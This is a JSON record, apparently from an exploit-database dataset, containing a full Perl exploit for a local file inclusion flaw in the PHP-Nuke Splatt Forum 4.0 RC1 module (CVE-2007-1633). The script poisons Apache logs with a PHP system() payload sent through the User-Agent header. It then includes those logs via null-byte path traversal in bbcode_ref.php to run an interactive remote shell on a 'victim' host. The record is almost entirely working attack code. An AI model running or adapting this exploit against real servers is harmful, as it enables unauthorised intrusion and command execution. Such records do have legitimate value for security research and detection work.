{
  "id": "3518",
  "title": "PHP-Nuke Module splattforum 4.0 RC1 - Local File Inclusion",
  "cve": "CVE-2007-1633",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# Modulo Splatt Forum v4.0 RC1(bbcode_ref.php name)Local File Include Exploit\r\n# D.Script: http://sourceforge.net/projects/splattforum/\r\n# V.Code\r\n# $module_name = $name;   <<<-------- Line : 17\r\n#\r\n# include(\"modules/\".$module_name.\"/functions.php\");  <<<-------- Line : 19\r\n# Dork: \"Splatt Forum\u00a9\"\r\n# Discovered & Coded by : GolD_M = [Mahmood_ali]\r\n# Contact:HackEr_@w.Cn\r\n# Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n@apache=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../.. /../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\nif (@ARGV < 3){\r\nprint \"\r\n##############################################################################\r\nModulo Splatt Forum v4.0 RC1(bbcode_ref.php name)Local File Include Exploit\r\n          Usage: Gold.pl [VicTim] /modules/Forum/ [apachepath]\r\n    Example: GolD.pl victim.com /modules/Forum/ ../logs/error.log\r\n          Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group\r\n                 Discovered & Coded by : GolD_M = [Mahmood_ali]\r\n##############################################################################\r\n\";\r\nexit();\r\n}\r\n\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$apachepath=$ARGV[2];\r\n\r\nprint \"Injecting code in log files...\\n\";\r\n$CODE=\"<?php ob_clean();system(\\$HTTP_COOKIE_VARS[cmd]);die;?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Connect Failed.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\nprint \"Write END to exit!\\n\";\r\nprint \"IF not working try another apache path\\n\\n\";\r\n\r\nprint \"[shell] \";$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"END\") {\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Connect Failed.\\n\\n\";\r\n    print $socket \"GET \".$path.\"bbcode_ref.php?name=\".$apache[$apachepath].\"%00&cmd=$cmd HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n    while ($raspuns = <$socket>)\r\n    {\r\n        print $raspuns;\r\n    }\r\n\r\n    print \"[shell] \";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\n# milw0rm.com [2007-03-19]",
  "url": "https://www.exploit-db.com/exploits/3518"
}